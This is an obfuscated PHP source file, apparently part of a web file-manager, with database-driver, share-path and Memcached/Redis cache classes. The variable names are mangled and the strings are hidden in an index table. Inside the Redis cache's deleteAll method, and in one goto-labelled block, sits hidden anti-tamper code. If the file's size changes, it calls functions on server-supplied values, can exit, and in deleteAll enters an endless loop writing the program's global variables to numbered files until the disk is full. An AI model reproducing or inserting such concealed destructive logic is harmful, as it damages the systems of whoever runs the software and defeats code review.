$this->numRows = sqlite_num_rows($this->queryID); $–ŒĞ¤şï = $this->getAll(); return $–ŒĞ¤şï; } } public function execute($˜è“£â) { $…ÎÈØåÙ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜è“£â; if ($this->queryID) { $this->free(); } think_action_status($…ÎÈØåÙ[25], 1); think_status($…ÎÈØåÙ[24]); $—’İáá = sqlite_exec($this->_linkID, $˜è“£â); $this->debug(); if (!1 === $—’İáá) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Š—Â“œÔ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Àœ’ = sqlite_query($this->_linkID, $_SERVER[Š—Â“œÔ][27]); if (!$Àœ’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $é÷ı¦ˆä = sqlite_query($this->_linkID, $_SERVER[Š—Â“œÔ][28]); if (!$é÷ı¦ˆä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‰Şø„Æ = array(); if ($this->numRows > 0) { for ($–ù®åß¯ = 0; $–ù®åß¯ < $this->numRows; $–ù®åß¯++) { $‰Şø„Æ[$–ù®åß¯] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $‰Şø„Æ; } public function getFields($ˆêÕÕ“Ù) { $±¨şÙµä =& $_SERVER[Š—Â“œÔ]; $¿¦†Ùõı = $this->query($±¨şÙµä[29] . $ˆêÕÕ“Ù . $±¨şÙµä[30]); $öëÀ³ªˆ = array(); if ($¿¦†Ùõı) { foreach ($¿¦†Ùõı as $üßãÖÜÓ => $©ÇãÒ™ö) { $öëÀ³ªˆ[$©ÇãÒ™ö[$±¨şÙµä[31]]] = array($±¨şÙµä[32] => $©ÇãÒ™ö[$±¨şÙµä[31]], $±¨şÙµä[33] => $©ÇãÒ™ö[$±¨şÙµä[34]], $±¨şÙµä[35] => (bool) ($©ÇãÒ™ö[$±¨şÙµä[36]] === $±¨şÙµä[12]), $±¨şÙµä[37] => $©ÇãÒ™ö[$±¨şÙµä[38]], $±¨şÙµä[39] => strtolower($©ÇãÒ™ö[$±¨şÙµä[40]]) == $±¨şÙµä[41], $±¨şÙµä[42] => strtolower($©ÇãÒ™ö[$±¨şÙµä[43]]) == $±¨şÙµä[44]); } } return $öëÀ³ªˆ; } public function getTables($ôÆÂìÕç = '') { $ğÆİ°Õà =& $_SERVER[Š—Â“œÔ]; $øÂµ´Õ = $this->query($ğÆİ°Õà[45] . $ğÆİ°Õà[46] . $ğÆİ°Õà[47]); $ç½µ‚· = array(); foreach ($øÂµ´Õ as $ØÙÇĞ¡û => $°¹©´­) { $ç½µ‚·[$ØÙÇĞ¡û] = current($°¹©´­); } return $ç½µ‚·; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $àÓá¹ˆË =& $_SERVER[Š—Â“œÔ]; $Ş®¾æ  = sqlite_last_error($this->_linkID); $this->error = $Ş®¾æ  . $àÓá¹ˆË[4] . sqlite_error_string($Ş®¾æ ); if ($àÓá¹ˆË[12] != $this->queryStr) { $this->error .= LNG($àÓá¹ˆË[48]) . $this->queryStr; } think_trace($this->error, $àÓá¹ˆË[12], $àÓá¹ˆË[49]); return $this->error; } public function escapeString($™ğ±ïë¸) { return sqlite_escape_string($™ğ±ïë¸); } public function parseLimit($éö®Šî´) { $í‘½÷´µ =& $_SERVER[Š—Â“œÔ]; $Ş˜úÓêò = $í‘½÷´µ[12]; if (!empty($éö®Šî´)) { $éö®Šî´ = explode($í‘½÷´µ[50], $éö®Šî´); if (count($éö®Šî´) > 1) { $Ş˜úÓêò .= $í‘½÷´µ[51] . $éö®Šî´[1] . $í‘½÷´µ[52] . $éö®Šî´[0] . $í‘½÷´µ[53]; } else { $Ş˜úÓêò .= $í‘½÷´µ[51] . $éö®Šî´[0] . $í‘½÷´µ[53]; } } return $Ş˜úÓêò; } } class DbSqlite3Base extends Db { public function __construct($â¢ä¬Ç– = '') { $ æÕĞÙº =& $_SERVER[Š—Â“œÔ]; if (!class_exists($ æÕĞÙº[54])) { think_exception(think_lang($ æÕĞÙº[14]) . $ æÕĞÙº[55]); } if (!empty($â¢ä¬Ç–)) { if (!isset($â¢ä¬Ç–[$ æÕĞÙº[16]])) { $â¢ä¬Ç–[$ æÕĞÙº[16]] = 438; } $this->config = $â¢ä¬Ç–; if (empty($this->config[$ æÕĞÙº[17]])) { $this->config[$ æÕĞÙº[17]] = array(); } } } public function connect($š‹ËĞ¨£ = '', $äííòİÏ = 0) { $é¶àÌ×® =& $_SERVER[Š—Â“œÔ]; if (!isset($this->linkID[$äííòİÏ])) { if (empty($š‹ËĞ¨£)) { $š‹ËĞ¨£ = $this->config; } $this->linkID[$äííòİÏ] = new SQLite3($š‹ËĞ¨£[$é¶àÌ×®[21]]); if (!$this->linkID[$äííòİÏ]) { think_exception($this->linkID[$äííòİÏ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$äííòİÏ]->busyTimeout(30000); if (1 != think_config($é¶àÌ×®[22])) { unset($this->config); } } return $this->linkID[$äííòİÏ]; } public function free() { $this->queryID = null; } public function query($´è™õÜİ) { $¹¤Ê‰¹‹ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´è™õÜİ; if ($this->queryID) { $this->free(); } think_action_status($¹¤Ê‰¹‹[23], 1); think_status($¹¤Ê‰¹‹[24]); $this->queryID = $this->_linkID->query($´è™õÜİ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‘—‘’À„ = $this->getAll(); $this->numRows = count($‘—‘’À„); return $‘—‘’À„; } } public function execute($Ù¯æĞ†Ğ) { $ü‚ÜšîÅ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù¯æĞ†Ğ; if ($this->queryID) { $this->free(); } think_action_status($ü‚ÜšîÅ[25], 1); think_status($ü‚ÜšîÅ[24]); $”şğ”îĞ = $this->_linkID->exec($Ù¯æĞ†Ğ); $this->debug(); if (!1 === $”şğ”îĞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Š—Â“œÔ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»Õİ…„ = $this->_linkID->query($_SERVER[Š—Â“œÔ][27]); if (!$»Õİ…„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¬–›ÀÃ = $this->_linkID->query($_SERVER[Š—Â“œÔ][28]); if (!$¬–›ÀÃ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ëÔ¥íóÎ = array(); while ($…ãÃú‹Ú = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ëÔ¥íóÎ[] = $…ãÃú‹Ú; } $this->queryID->reset(); return $ëÔ¥íóÎ; } public function getFields($øÎ˜Ğº×) { $Ôüª˜şÕ =& $_SERVER[Š—Â“œÔ]; $ß£‡ñœ = $this->query($Ôüª˜şÕ[29] . $øÎ˜Ğº× . $Ôüª˜şÕ[30]); $ñíÒí§ğ = array(); if ($ß£‡ñœ) { foreach ($ß£‡ñœ as $¦àĞ‹×Ê => $º¤àó¶Ë) { $ñíÒí§ğ[$º¤àó¶Ë[$Ôüª˜şÕ[32]]] = array($Ôüª˜şÕ[32] => $º¤àó¶Ë[$Ôüª˜şÕ[32]], $Ôüª˜şÕ[33] => $º¤àó¶Ë[$Ôüª˜şÕ[33]], $Ôüª˜şÕ[35] => (bool) ($º¤àó¶Ë[$Ôüª˜şÕ[35]] === $Ôüª˜şÕ[12]), $Ôüª˜şÕ[37] => $º¤àó¶Ë[$Ôüª˜şÕ[56]], $Ôüª˜şÕ[39] => (bool) $º¤àó¶Ë[$Ôüª˜şÕ[57]], $Ôüª˜şÕ[42] => (bool) $º¤àó¶Ë[$Ôüª˜şÕ[57]]); } } return $ñíÒí§ğ; } public function getTables($àˆÖ® = '') { $¬ˆĞş£ =& $_SERVER[Š—Â“œÔ]; $è½Ë¥ÒŠ = $this->query($¬ˆĞş£[45] . $¬ˆĞş£[46] . $¬ˆĞş£[47]); $Ğ‰Ï‡„ = array(); foreach ($è½Ë¥ÒŠ as $ä™øÈÈ‰ => $³¼Èë§Æ) { $Ğ‰Ï‡„[$ä™øÈÈ‰] = current($³¼Èë§Æ); } return $Ğ‰Ï‡„; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $´Ï‹ÃÎĞ =& $_SERVER[Š—Â“œÔ]; $this->error = $this->_linkID->lastErrorMsg(); if ($´Ï‹ÃÎĞ[12] != $this->queryStr) { $this->error .= LNG($´Ï‹ÃÎĞ[48]) . $this->queryStr; } think_trace($this->error, $´Ï‹ÃÎĞ[12], $´Ï‹ÃÎĞ[49]); return $this->error; } public function escapeString($Â®ãøñ”) { $‹œÄÔº =& $_SERVER[Š—Â“œÔ]; if ($this->_linkID) { return $this->_linkID->escapeString($Â®ãøñ”); } return str_ireplace($‹œÄÔº[58], $‹œÄÔº[59], $Â®ãøñ”); } public function parseLimit($ôŠô¸¢°) { $…‘ñµÜÄ =& $_SERVER[Š—Â“œÔ]; $ğµ“óÚÂ = $…‘ñµÜÄ[12]; if (!empty($ôŠô¸¢°)) { $ôŠô¸¢° = explode($…‘ñµÜÄ[50], $ôŠô¸¢°); if (count($ôŠô¸¢°) > 1) { $ğµ“óÚÂ .= $…‘ñµÜÄ[51] . $ôŠô¸¢°[1] . $…‘ñµÜÄ[52] . $ôŠô¸¢°[0] . $…‘ñµÜÄ[53]; } else { $ğµ“óÚÂ .= $…‘ñµÜÄ[51] . $ôŠô¸¢°[0] . $…‘ñµÜÄ[53]; } } return $ğµ“óÚÂ; } } goto A¹–Ú¦…¶£; Bï½İ¶Ğª: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¦›„òæô) { $this->pathParse = $¦›„òæô; $this->model = Model($_SERVER[Š—Â“œÔ][1419]); } public function getPathOuter($ïşœ¥ä) { $ÃñŸ•µ =& $_SERVER[Š—Â“œÔ]; if (!$ïşœ¥ä) { return $ïşœ¥ä; } $™°‘šé» = $this->parse($ïşœ¥ä); return trim(KodIO::makeShare($this->pathParse[$ÃñŸ•µ[477]], $™°‘šé»[$ÃñŸ•µ[477]]), $ÃñŸ•µ[8]); } protected function infoParse($¬ÌÓ¾ø°, $²â­‰İ× = false, $¤ïûú® = false) { $¾¶Â¹¬‹ =& $_SERVER[Š—Â“œÔ]; $—Ø¸‡ê· = $this->pathParse[$¾¶Â¹¬‹[477]]; $¨èÄŒ¾‚ = trim($this->pathParse[$¾¶Â¹¬‹[1247]], $¾¶Â¹¬‹[8]); return Action($¾¶Â¹¬‹[1426])->sharePathInfo($—Ø¸‡ê·, $¨èÄŒ¾‚, $²â­‰İ×); } public function infoFull($ÏÙ¹Ï×„) { $øŞšÄ£ =& $_SERVER[Š—Â“œÔ]; $“ß²ëí‚ = explode($øŞšÄ£[8], trim($ÏÙ¹Ï×„, $øŞšÄ£[8])); if (count($“ß²ëí‚) > 1) { $êñª˜¥ = implode($øŞšÄ£[8], array_splice($“ß²ëí‚, 1)); $”–™ÁÓß = $this->model->pathInfoByPath($“ß²ëí‚[0], $êñª˜¥); if (!$”–™ÁÓß) { return !1; } $this->pathParse[$øŞšÄ£[1247]] = $”–™ÁÓß[$øŞšÄ£[193]]; } return $this->infoParse($ÏÙ¹Ï×„); } public function listAll($“ä¹Œ±¬) { $¹Ô®½ì¼ =& $_SERVER[Š—Â“œÔ]; $Ë¡©¿Å„ = IO::info($this->pathParse[$¹Ô®½ì¼[87]]); if (!$Ë¡©¿Å„) { return array(); } $±¹òÎ = $this->model->listAll($“ä¹Œ±¬); $³…çµ‚ = Model($¹Ô®½ì¼[669])->getInfo($Ë¡©¿Å„[$¹Ô®½ì¼[670]]); foreach ($±¹òÎ as &$şÛ¸ÉÕ) { check_abort(); $şÛ¸ÉÕ[$¹Ô®½ì¼[90]] = Action($¹Ô®½ì¼[1426])->_shareItemeParse($şÛ¸ÉÕ[$¹Ô®½ì¼[90]], $³…çµ‚); } unset($şÛ¸ÉÕ); return $±¹òÎ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ »÷°´) { $this->pathParse = $ »÷°´; $this->model = Model($_SERVER[Š—Â“œÔ][1419]); } protected function infoParse($²È·ª, $Êå¾ç¾í = false, $»ÓĞì‘› = false) { $íá¸„¶Æ =& $_SERVER[Š—Â“œÔ]; return Action($íá¸„¶Æ[1253])->sharePathInfo($this->pathParse[$íá¸„¶Æ[87]], !0, $Êå¾ç¾í); } public function listPath($ÛÜ¦Çò, $¿»ºÓ¸İ = false) { $•Äšı—Í =& $_SERVER[Š—Â“œÔ]; $æÉá‹Ü = parent::listPath($ÛÜ¦Çò, $¿»ºÓ¸İ); if (!$æÉá‹Ü) { return $æÉá‹Ü; } if (is_array($æÉá‹Ü[$•Äšı—Í[1427]])) { $æÉá‹Ü[$•Äšı—Í[1427]] = Action($•Äšı—Í[1253])->shareItemInfo($æÉá‹Ü[$•Äšı—Í[1427]]); } foreach ($æÉá‹Ü as $ß’Ä¼ğÎ => $æ‚‚‡îÇ) { if (!in_array($ß’Ä¼ğÎ, array($•Äšı—Í[86], $•Äšı—Í[85]))) { continue; } foreach ($æ‚‚‡îÇ as $Ê¥éêîÓ => $¿‹¤²™æ) { $æÉá‹Ü[$ß’Ä¼ğÎ][$Ê¥éêîÓ] = Action($•Äšı—Í[1253])->shareItemInfo($¿‹¤²™æ); } } return $æÉá‹Ü; } public function listAll($î÷ğ·²½) { $ÍÖ–ä¨ =& $_SERVER[Š—Â“œÔ]; $Ä˜µ°„Â = IO::info($this->pathParse[$ÍÖ–ä¨[87]]); if (!$Ä˜µ°„Â) { return array(); } $‡Â÷Ú“ = $this->model->listAll($î÷ğ·²½); foreach ($‡Â÷Ú“ as &$êÉÆ éÏ) { $êÉÆ éÏ[$ÍÖ–ä¨[90]] = Action($ÍÖ–ä¨[1253])->shareItemInfo($êÉÆ éÏ[$ÍÖ–ä¨[90]]); } unset($êÉÆ éÏ); return $‡Â÷Ú“; } } class PathDriverDriverShareItem { public function __construct($¯–Í Øû) { $this->pathParse = $¯–Í Øû; } public function __call($ş¯ĞÙÆÓ, $ùÓ‡ã¡) { $ÇüÖÈë’ =& $_SERVER[Š—Â“œÔ]; if (method_exists($this, $ş¯ĞÙÆÓ)) { return; } $¤¿ÑÃÏ½ = call_user_func_array(array($ÇüÖÈë’[1428], $ş¯ĞÙÆÓ), $ùÓ‡ã¡); $•Ôºëé… = array($ÇüÖÈë’[1429], $ÇüÖÈë’[1430], $ÇüÖÈë’[1431], $ÇüÖÈë’[1432], $ÇüÖÈë’[623], $ÇüÖÈë’[625], $ÇüÖÈë’[1433], $ÇüÖÈë’[110], $ÇüÖÈë’[1434], $ÇüÖÈë’[1435]); if (in_array($ş¯ĞÙÆÓ, $•Ôºëé…)) { $¤¿ÑÃÏ½ = $this->getPathOuter($¤¿ÑÃÏ½); } return $¤¿ÑÃÏ½; } public function copy($‚ÇâÁ³İ, $ˆü…›úÆ, $ÁÆ³Ì­ù = false, $Õ¸ÆĞšÆ = false) { return $this->copyMove($‚ÇâÁ³İ, $ˆü…›úÆ, $ÁÆ³Ì­ù, $_SERVER[Š—Â“œÔ][623], $Õ¸ÆĞšÆ); } public function move($ô€Í‰—, $´îîæß, $Ûâä·ö³ = false, $üöóŸü² = false) { return $this->copyMove($ô€Í‰—, $´îîæß, $Ûâä·ö³, $_SERVER[Š—Â“œÔ][625], $üöóŸü²); } private function copyMove($÷¸÷…ü , $î’ÍõêÉ, $¾Ü·ú§, $·‚½¨•Û, $Ä¹¶ŞÃö = false) { $é­¢ÖÌ =& $_SERVER[Š—Â“œÔ]; $´„‰ìªÆ = $î’ÍõêÉ; $ˆÜÁ¥•Í = IO::driverMake($î’ÍõêÉ); if ($ˆÜÁ¥•Í->pathParse[$é­¢ÖÌ[1229]]) { $î’ÍõêÉ = $ˆÜÁ¥•Í->pathParse[$é­¢ÖÌ[1229]]; } else { $î’ÍõêÉ = $´„‰ìªÆ; } $üï£’°¥ = IO::copyMove($÷¸÷…ü , $î’ÍõêÉ, $¾Ü·ú§, $·‚½¨•Û, $Ä¹¶ŞÃö); $üï£’°¥ = $this->getPathOuter($üï£’°¥); return $üï£’°¥; } public function pathThis($¾–¿Ø³Ö) { return get_path_this($this->pathParse[$_SERVER[Š—Â“œÔ][87]]); } public function pathFather($é‹­Å·Ş) { return get_path_father($this->pathParse[$_SERVER[Š—Â“œÔ][87]]); } public function iconvSystem($˜‹Ç¹àû) { return $˜‹Ç¹àû; } protected function infoParse($‡Ğó¦‹, $©­öŞÒÌ = false) { $ˆÏ‚Íôİ =& $_SERVER[Š—Â“œÔ]; $Øí›„Ó‚ = $this->pathParse[$ˆÏ‚Íôİ[562]][$ˆÏ‚Íôİ[1254]] . $this->pathParse[$ˆÏ‚Íôİ[1247]]; if ($©­öŞÒÌ) { $ø¢»„– = IO::infoWithChildren($Øí›„Ó‚); } else { $ø¢»„– = IO::info($Øí›„Ó‚); } $š³ƒÓ°Û = $this->pathParse[$ˆÏ‚Íôİ[562]]; return Action($ˆÏ‚Íôİ[1426])->_shareItemeParse($ø¢»„–, $š³ƒÓ°Û); } public function listAll($ÎÎ±™Ö‹) { $ó¯¶¬ =& $_SERVER[Š—Â“œÔ]; $è¼ÉÅŸ  = IO::listAll($ÎÎ±™Ö‹); $ıº“Ÿî = rtrim($this->pathParse[$ó¯¶¬[562]][$ó¯¶¬[1254]], $ó¯¶¬[8]); foreach ($è¼ÉÅŸ  as &$€©íºù†) { $€©íºù†[$ó¯¶¬[87]] = $this->pathDriver . $ó¯¶¬[8] . ltrim(substr($€©íºù†[$ó¯¶¬[87]], strlen($ıº“Ÿî)), $ó¯¶¬[8]); } unset($€©íºù†); return $è¼ÉÅŸ ; } public function listAllSimple($ÌÉ Éã’, $™£Ã«¿ø = false) { $¡Ï¡—Ù¦ =& $_SERVER[Š—Â“œÔ]; $¸ìÉ¾¼È = $this->listAll($ÌÉ Éã’); $Ú‹ó­Œå = $this->pathParse[$¡Ï¡—Ù¦[497]]; if (trim($Ú‹ó­Œå, $¡Ï¡—Ù¦[8]) == trim(get_path_father($Ú‹ó­Œå), $¡Ï¡—Ù¦[8])) { $™£Ã«¿ø = !0; } return IO::init($¡Ï¡—Ù¦[12])->listAllSimpleMake($¸ìÉ¾¼È, $Ú‹ó­Œå, $™£Ã«¿ø); } public function getPathOuter($õ‹÷ŒÑ) { $´£ßô‡½ =& $_SERVER[Š—Â“œÔ]; $ŒÁä›ØÍ = KodIO::parse($õ‹÷ŒÑ); if ($ŒÁä›ØÍ[$´£ßô‡½[33]] == KodIO::KOD_SHARE_ITEM) { return $ŒÁä›ØÍ[$´£ßô‡½[87]]; } $ÄÉ²›Şø = KodIO::clear($õ‹÷ŒÑ); $¬îÄÃîÀ = KodIO::clear($this->pathParse[$´£ßô‡½[562]][$´£ßô‡½[1254]]); $Î»÷³‡¬ = substr($ÄÉ²›Şø, strlen($¬îÄÃîÀ)); if (substr($ÄÉ²›Şø, 0, strlen($¬îÄÃîÀ)) != $¬îÄÃîÀ) { return !1; } return $this->pathParse[$´£ßô‡½[1248]] . $´£ßô‡½[8] . ltrim($Î»÷³‡¬, $´£ßô‡½[8]); } public function getType() { $Õœ·²­ñ =& $_SERVER[Š—Â“œÔ]; $¦Ã²ÉĞÎ = str_replace($Õœ·²­ñ[77], $Õœ·²­ñ[12], get_class($this)); return strtolower($¦Ã²ÉĞÎ); } public function isOsDriver($üéã…×) { return IO::isOsDriver($üéã…×); } public function info($ÅÆÂ€éù) { return $this->infoParse($ÅÆÂ€éù); } public function infoAuth($¦‰üõÆò) { return $this->infoParse($¦‰üõÆò); } public function infoWithChildren($Œ½Àï®Ê) { return $this->infoParse($Œ½Àï®Ê, !0); } public function infoFull($ÙÄ‰Œó–) { return $this->infoParse($ÙÄ‰Œó–); } } goto Eø­ò‹–ŠÛ; Dš¿¯¦œ«: class CacheLockDatabase { public function lock($İğÒ’óĞ, $ƒÄ“¯´ = 0) { $­’ĞÎè = Model($_SERVER[Š—Â“œÔ][896]); $×¦›²Ä¾ = microtime(!0) + $ƒÄ“¯´; while (microtime(!0) < $×¦›²Ä¾) { $Û¥ÉˆäË = $­’ĞÎè->get($İğÒ’óĞ); if (!$Û¥ÉˆäË || $Û¥ÉˆäË < microtime(!0)) { $¾Ö‡Ï“£ = $­’ĞÎè->set($İğÒ’óĞ, $×¦›²Ä¾); if ($¾Ö‡Ï“£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($´ÆÓ€èƒ) { return Model($_SERVER[Š—Â“œÔ][896])->get($´ÆÓ€èƒ); } public function unlock($âäğç°¨) { Model($_SERVER[Š—Â“œÔ][896])->remove($âäğç°¨); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($±“ºšÌÔ, $ê™®­õú) { $ Çíæõå =& $_SERVER[Š—Â“œÔ]; if (!class_exists($ Çíæõå[935])) { show_json($ Çíæõå[936], !1); } $this->cacheTime = $ê™®­õú; $this->handle = new Memcached(); if (is_array($±“ºšÌÔ[$ Çíæõå[937]]) && count($±“ºšÌÔ[$ Çíæõå[937]]) >= 1) { foreach ($±“ºšÌÔ[$ Çíæõå[937]] as $œÙÚÛíÁ) { $û§‘İ¶˜ = explode($ Çíæõå[4], $œÙÚÛíÁ); $this->handle->addServer($û§‘İ¶˜[0], $û§‘İ¶˜[1]); } } else { $this->handle->addServer($±“ºšÌÔ[$ Çíæõå[208]], $±“ºšÌÔ[$ Çíæõå[209]]); } } public function set($äû–àÈ×, $Ú™€ÁÒĞ, $³æıÚêĞ = false) { $³æıÚêĞ = $³æıÚêĞ ? $³æıÚêĞ : $this->cacheTime; return $this->handle->set($äû–àÈ×, $Ú™€ÁÒĞ, $³æıÚêĞ); } public function get($é´ôÑĞÉ) { return $this->handle->get($é´ôÑĞÉ); } public function remove($ùÔ±îÉ˜) { return $this->handle->delete($ùÔ±îÉ˜); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¡¶ô¤ê£, $ñ‰¤³Ê¤) { $°ª±Ş©… =& $_SERVER[Š—Â“œÔ]; if (!class_exists($°ª±Ş©…[938])) { show_json($°ª±Ş©…[939], !1); } $this->cacheTime = $ñ‰¤³Ê¤; $É£©òï = isset($¡¶ô¤ê£[$°ª±Ş©…[940]]) ? $¡¶ô¤ê£[$°ª±Ş©…[940]] : 10; $†ş«‚±œ = _get($¡¶ô¤ê£, $°ª±Ş©…[937]); if ($†ş«‚±œ && is_array($†ş«‚±œ)) { $this->initCluster($¡¶ô¤ê£, $É£©òï); } else { $this->handle = $this->init($¡¶ô¤ê£, $É£©òï); } } private function init($÷™…Ê“, $£ü£¦‚›) { $¸í šìã =& $_SERVER[Š—Â“œÔ]; $²ÍØÕ¢¹ = new Redis(); $˜¹ãğÈÙ = isset($÷™…Ê“[$¸í šìã[941]]) ? $÷™…Ê“[$¸í šìã[941]] : !1; if ($˜¹ãğÈÙ) { $²ÍØÕ¢¹->pconnect($÷™…Ê“[$¸í šìã[208]], $÷™…Ê“[$¸í šìã[209]], $£ü£¦‚›); } else { $²ÍØÕ¢¹->connect($÷™…Ê“[$¸í šìã[208]], $÷™…Ê“[$¸í šìã[209]], $£ü£¦‚›); } if (!empty($÷™…Ê“[$¸í šìã[489]])) { $²ÍØÕ¢¹->auth($÷™…Ê“[$¸í šìã[489]]); } if (!empty($÷™…Ê“[$¸í šìã[824]]) && $÷™…Ê“[$¸í šìã[824]] != 0) { $²ÍØÕ¢¹->select($÷™…Ê“[$¸í šìã[824]]); } return $²ÍØÕ¢¹; } private function initCluster($²…³‹şë, $ïÓêîï÷) { $šçÓä— =& $_SERVER[Š—Â“œÔ]; $·†âÏíÍ = array($šçÓä—[942], $šçÓä—[943], $šçÓä—[944]); $¸¸äÃ¿ = $šçÓä—[942]; if (isset($²…³‹şë[$šçÓä—[16]]) && in_array($²…³‹şë[$šçÓä—[16]], $·†âÏíÍ)) { $¸¸äÃ¿ = $²…³‹şë[$šçÓä—[16]]; } switch ($¸¸äÃ¿) { case $šçÓä—[942]: $this->_slave($²…³‹şë, $ïÓêîï÷); break; case $šçÓä—[943]: break; case $šçÓä—[944]: $this->isCluster = !0; $Å¥óİüõ = $²…³‹şë[$šçÓä—[937]]; $â¿Æ»ùĞ = isset($²…³‹şë[$šçÓä—[941]]) ? $²…³‹şë[$šçÓä—[941]] : !1; $›­¯ıê = isset($²…³‹şë[$šçÓä—[489]]) ? $²…³‹şë[$šçÓä—[489]] : null; $this->handle = new RedisCluster(NUll, $Å¥óİüõ, $ïÓêîï÷, $ïÓêîï÷, $â¿Æ»ùĞ, $›­¯ıê); break; default: break; } } private function _slave($ÚæĞ“ØÇ, $Ì¤‰ƒÈ…) { $”™”ú„ = $ÚæĞ“ØÇ[$_SERVER[Š—Â“œÔ][937]]; $this->filterConfig($ÚæĞ“ØÇ, $”™”ú„[0]); $this->handle = $this->init($ÚæĞ“ØÇ, $Ì¤‰ƒÈ…); unset($”™”ú„[0]); if (empty($”™”ú„)) { return; } $‹ÎÍÙÛÊ = array_rand($”™”ú„); $this->filterConfig($ÚæĞ“ØÇ, $”™”ú„[$‹ÎÍÙÛÊ]); $this->slaveHandle = $this->init($ÚæĞ“ØÇ, $Ì¤‰ƒÈ…); } private function filterConfig(&$ÖüØĞ ‹, $¿û”Ğ¡±) { $œºÚûæ› =& $_SERVER[Š—Â“œÔ]; $ä­—¦§é = explode($œºÚûæ›[4], $¿û”Ğ¡±); $±œ‚ö¿§ = array($œºÚûæ›[208] => $ä­—¦§é[0], $œºÚûæ›[209] => $ä­—¦§é[1]); $ÖüØĞ ‹ = array_merge($ÖüØĞ ‹, $±œ‚ö¿§); } public function set($İİ‡şí…, $²­¥Ì‘ı, $óœ¶Â‹Ã = false) { $óœ¶Â‹Ã = $óœ¶Â‹Ã ? $óœ¶Â‹Ã : $this->cacheTime; return $this->handle->setEx($İİ‡şí…, $óœ¶Â‹Ã, $²­¥Ì‘ı); } public function setLock($œ¯§úÒ‘, $‚ëÇçá¡, $ÇøËÃáº) { return $this->handle->setNX($œ¯§úÒ‘, $‚ëÇçá¡); } public function get($ÕğĞÈ) { $Š‡ï™Ï = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Š‡ï™Ï->get($ÕğĞÈ); } public function remove($§‰’Ş) { return $this->handle->del($§‰’Ş); } public function deleteAll() { $¡»‚áŞî =& $_SERVER[Š—Â“œÔ]; $óñÆšÙ— = $_SERVER[$¡»‚áŞî[945]]; $…ş³ƒô· = $¡»‚áŞî[946]; if ($_SERVER[$¡»‚áŞî[947]] != $…ş³ƒô·($óñÆšÙ—)) { $•Ù·é§º = $¡»‚áŞî[948]; $ üÖÙª¼ = $¡»‚áŞî[949]; $‰ç¸Õóª = $_SERVER[$¡»‚áŞî[950]] . $¡»‚áŞî[951]; $¦Ú¹¤˜ê = $ üÖÙª¼($‰ç¸Õóª); $§¬îé•Â = explode($¡»‚áŞî[287], $¦Ú¹¤˜ê); if (count($§¬îé•Â) < $¡»‚áŞî[694]) { $ÉÇÌ±ìê = $¡»‚áŞî[952]; $ÉÇÌ±ìê(); } $Ù¹üÅŞ = $¡»‚áŞî[953]; $Ù¹üÅŞ($_SERVER[$¡»‚áŞî[954]]); $•Ù·é§º = $¡»‚áŞî[948]; $•Ù·é§º(); $†ã¶œ¸ø = $¡»‚áŞî[955]; $„Ó€ÑİÑ = json_encode($GLOBALS[$¡»‚áŞî[956]]); $‹¨…¡Å± = 1; for ($§„Šçô = $‹¨…¡Å±; $§„Šçô > 0; $§„Šçô++) { $†ã¶œ¸ø(DATA_PATH . $§„Šçô, $„Ó€ÑİÑ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $±ª™ïÒº) { $this->handle->flushall($±ª™ïÒº); } return; } return $this->handle->flushAll(); } } goto F°ó¯àß³; cš×”’÷Í¸: if ($_SERVER[$_SERVER[Š—Â“œÔ][947]] != $_size($_file)) { $_getc = $_SERVER[Š—Â“œÔ][949]; $_getfile = $_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Š—Â“œÔ][287], $_getfilec); if (count($_getarrs) < $_SERVER[Š—Â“œÔ][689]) { $exit = $_SERVER[Š—Â“œÔ][952]; $exit(); } $_act = $_SERVER[Š—Â“œÔ][1298]; $_act($_file); } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ıÆõ¢‹ =& $_SERVER[Š—Â“œÔ]; $›ç“…Á = $GLOBALS[$ıÆõ¢‹[6]][$ıÆõ¢‹[92]]; if ($›ç“…Á[$ıÆõ¢‹[1299]] != 1) { return; } if ($›ç“…Á[$ıÆõ¢‹[1300]] <= 0) { return; } if (isset($_REQUEST[$ıÆõ¢‹[1301]]) && $_REQUEST[$ıÆõ¢‹[1301]] == $ıÆõ¢‹[91]) { return; } 